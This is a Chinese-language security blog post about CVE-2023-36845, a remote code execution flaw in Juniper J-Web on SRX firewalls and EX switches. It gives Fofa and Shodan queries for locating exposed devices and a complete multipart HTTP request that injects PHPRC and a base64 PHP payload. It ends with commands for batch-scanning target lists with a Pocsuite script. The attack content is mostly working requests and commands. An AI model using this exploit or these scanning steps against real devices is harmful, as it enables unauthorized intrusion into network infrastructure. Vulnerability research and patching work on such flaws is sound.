<meta name="referrer" content="no-referrer"/>
> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/4vfAwjAdgS56gi87Dme9nw)

**声明：**该公众号大部分文章来自作者日常学习，也有部分文章是经过作者授权和其他公众号白名单转载，未经授权，严禁转载，如需转载，联系 SheYin。请勿利用文章内的相关技术从事非法测试，如因此产生的一切不良后果与文章作者和本公众号无关。

0x01 前言

EX 系列和 SRX 系列 Juniper Networks Junos OS 的 J-Web 中存在 PHP 外部变量修改漏洞，使未经身份验证的基于网络的攻击者能够远程执行代码。攻击者可以使用精心编制的设置变量 PHPRC 的请求来修改 PHP 执行环境，从而允许代码的注入和执行。

0x02 影响平台

```
Juniper SRX防火墙和EX交换机

```

‍

0x03 漏洞复现

```
Fofa：title="Juniper" && icon_hash="2141724739"
shodan：title:"Juniper" http.favicon.hash:2141724739

```

首页：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/fMIPoqZAkaQ96DphQ5hH8G8D3F1h7riaerrhhfo7NzDCAkU3VDb2yib1KYGWenxoMpia218H2WqVIIj3JcGVRRLvw/640?wx_fmt=png)

Juniper 防火墙使用 Appweb Web 服务器。当 Appweb 调用 CGI 脚本时，它会传递各种环境变量和参数，以便脚本可以访问用户的 HTTP 请求。HTTP 请求的正文通过 stdin 传递。受影响的防火墙运行 FreeBSD，每个 FreeBSD 进程都可以打开 / dev/fd/0

![](https://mmbiz.qpic.cn/sz_mmbiz_png/fMIPoqZAkaQ96DphQ5hH8G8D3F1h7riae259JbZria1QyBW7APNxAHZaxxceX2NYsWxibcYgPHPTS6vyy8fsDoaqQ/640?wx_fmt=png)

将 PHPRC 环境变量设置为 / dev/fd/0，将 allow_url_include 设置为 1，auto_propend_file 用 data 协议传入 PHP 代码

POC：

```
POST / HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Accept: */*
Content-Length: 433
Content-Type: multipart/form-data; boundary=------------------------d243ab87a113ee7a
--------------------------d243ab87a113ee7a
Content-Disposition: form-data; 
1
--------------------------d243ab87a113ee7a
Content-Disposition: form-data; 
"data://text/plain;base64,PD8gZWNobyAnQ1ZFLTIwMjMtMzY4NDUnOyA/Pg=="
--------------------------d243ab87a113ee7a
Content-Disposition: form-data; 
/dev/fd/0
--------------------------d243ab87a113ee7a--

```

0x04 修复建议  

```
更新至产品最新版本：
https://www.juniper.net/

```

‍‍0x05 参考链接

```
https://nvd.nist.gov/vuln/detail/CVE-2023-36845
https://vulncheck.com/blog/juniper-cve-2023-36845

```

‍  

关注公众号回复 **CVE-2023-36845** 获取 Pocsuite 框架 POC

使用方法：pocsuite -r CVE-2023-36845.py -u [url]

```
pocsuite3安装(python3环境)
pip3 install pocsuite3
设置代理
pocsuite -r CVE-2023-36845.py -u [url] --proxy http://IP:PORT
批量验证
pocsuite -r CVE-2023-36845.py -f [file.txt]

```